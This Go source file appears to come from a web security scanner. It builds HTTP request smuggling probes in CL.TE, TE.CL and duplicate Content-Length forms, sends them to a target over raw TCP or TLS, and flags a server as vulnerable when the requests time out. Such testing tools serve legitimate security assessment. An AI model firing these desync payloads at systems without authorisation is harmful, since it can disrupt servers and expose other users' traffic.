package pkg

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"net"
	"strings"
	"time"
)

func init() {

}

func generateHeaderString() string {
	headers := ""
	userAgent := useragent
	for _, h := range Config.Headers {
		h = strings.TrimSuffix(h, "\r")
		h = strings.TrimSpace(h)
		if h == "" {
			continue
		} else if !strings.Contains(h, ":") {
			msg := "Specified header" + h + "doesn't contain a : and will be skipped"
			Print(msg, NoColor)
			continue
		} else {
			headers += h + "\r\n"

			hSplitted := strings.SplitN(h, ":", 2)
			hSplitted[0] = strings.TrimSpace(hSplitted[0])
			hSplitted[1] = strings.TrimSpace(hSplitted[1])

			if strings.EqualFold(hSplitted[0], "User-Agent") {
				userAgent = hSplitted[1]
			}
		}
	}
	// if its the same, the useragent wasnt added yet
	if userAgent == useragent {
		headers += "User-Agent: " + useragent + "\r\n"
	}

	return headers
}

/* Run clte before TECL. Dont test for TECL if clte already works! */
func clte(headers string) string {
	payload := fmt.Sprintf(""+
		"POST %s HTTP/1.1\r\n"+ //			 POST /about HTTP/1.1
		"Host: %s\r\n"+ //					 Host: example.com
		"%s"+ //							 *Additional Headers generated*
		"Transfer-Encoding: chunked\r\n"+ // Transfer-Encoding: chunked
		"Content-Length: 4\r\n"+ //			 Content-Length: 4
		"\r\n"+ //
		"1\r\n"+ //							 1
		"Z\r\n"+ //							 Z
		"Q\r\n"+ //							 Q
		"", Config.Website.Url.Path, Config.Website.BaseUrlStr, headers)

	return payload
}

func tecl(headers string) string {
	payload := fmt.Sprintf(""+
		"POST %s HTTP/1.1\r\n"+ //			 POST /about HTTP/1.1
		"Host: %s\r\n"+ //					 Host: example.com
		"%s"+ //							 *Additional Headers generated*
		"Transfer-Encoding: chunked\r\n"+ // Transfer-Encoding: chunked
		"Content-Length: 6\r\n"+ //			 Content-Length: 6
		"\r\n"+ //
		"0\r\n"+ //							 0
		"\r\n"+ //
		"X\r\n"+ //							 X
		"", Config.Website.Url.Path, Config.Website.BaseUrlStr, headers)

	return payload
}

func clcl(headers string) string {
	payload := fmt.Sprintf(""+
		"POST %s HTTP/1.1\r\n"+ //			 POST /about HTTP/1.1
		"Host: %s\r\n"+ //					 Host: example.com
		"%s"+ //							 *Additional Headers generated*
		"Content-Length: 4\r\n"+ // 		 Content-Length: 4
		"Content-Length: 6\r\n"+ //			 Content-Length: 6
		"\r\n"+ //
		"M\r\n"+ //							 M
		"1\r\n"+ //							 1
		"0\r\n"+ //							 0
		"X\r\n"+ //							 X
		"", Config.Website.Url.Path, Config.Website.BaseUrlStr, headers)

	return payload
}

func clcl2(headers string) string {
	payload := fmt.Sprintf(""+
		"POST %s HTTP/1.1\r\n"+ //			 POST /about HTTP/1.1
		"Host: %s\r\n"+ //					 Host: example.com
		"%s"+ //							 *Additional Headers generated*
		"Content-Length: 6\r\n"+ //			 Content-Length: 6
		"Content-Length: 4\r\n"+ //			 Content-Length: 4
		"\r\n"+ //
		"M\r\n"+ //							 M
		"1\r\n"+ //							 1
		"0\r\n"+ //							 0
		"X\r\n"+ //							 X
		"", Config.Website.Url.Path, Config.Website.BaseUrlStr, headers)

	return payload
}

func httpRequestSmuggling(req string, result Result, tlsConfig *tls.Config) Result {
	https := false
	address := Config.Website.Domain
	address = strings.TrimSuffix(address, "/")
	if strings.HasPrefix(Config.Website.Domain, "https://") {
		https = true
		address = strings.TrimPrefix(address, "https://")
		if !strings.Contains(address, ":") {
			address += ":443"
		}
	} else if strings.HasPrefix(Config.Website.Domain, "http://") {
		address = strings.TrimPrefix(address, "http://")
		if !strings.Contains(address, ":") {
			address += ":80"
		}
	} else {
		msg := "Request Smuggling: " + Config.Website.Domain + " doesn't has http:// or https:// as prefix\n"
		Print(msg, Yellow)
		return result
	}

	dialer := net.Dialer{Timeout: time.Duration(Config.TimeOut) * time.Second}

	timeOutCount := 0
	for i := 0; i < 3; i++ {
		var err error
		var connS *tls.Conn
		var conn net.Conn
		var resp string

		if https {
			if tlsConfig == nil {
				tlsConfig = new(tls.Config)
				//tlsConfig.InsecureSkipVerify = true
			}
			connS, err = tls.Dial("tcp", address, tlsConfig)
		} else {
			conn, err = dialer.Dial("tcp", address)
		}
		if err != nil {
			PrintFatal(err.Error())
		}
		defer conn.Close()

		if https {
			fmt.Fprint(connS, req)
			connS.SetReadDeadline(time.Now().Add(time.Duration(Config.TimeOut) * time.Second))
			resp, err = bufio.NewReader(connS).ReadString('\n')

		} else {
			fmt.Fprint(conn, req)
			conn.SetReadDeadline(time.Now().Add(time.Duration(Config.TimeOut) * time.Second))
			resp, err = bufio.NewReader(conn).ReadString('\n')

		}

		if err != nil {
			msg := "Request Smuggling: " + err.Error() + "\n"
			Print(msg, Yellow)

			// Time out error is same for TLS and Conn. Both use net.Error.Timeout
			nerr, _ := err.(net.Error)
			if nerr != nil && nerr.Timeout() {
				timeOutCount++
				msg := fmt.Sprintf("(%d/3) timeouts to confirm Request Smuggling\n", i+1)
				Print(msg, Yellow)
				//TODO: Wenn timeout, dann noch ein normales request senden, welches nicht auch timeouten darf?
			} else {
				msg := "Aborting test because of: " + err.Error() + "\n"
				Print(msg, Yellow)
				result.HasError = true
				result.ErrorMessages = append(result.ErrorMessages, msg)
				return result
			}
		} else {
			// When there isn't a timout this means that the Request Smuggling technique wasn't successful!
			// TODO: Print entfernen!
			msg := "Request didn't time out and therefore isn't vulnerable to this Request Smuggling technique.\n"
			Print(msg, Yellow)
			Print(resp, Red)
			return result
		}
	}

	return result
}
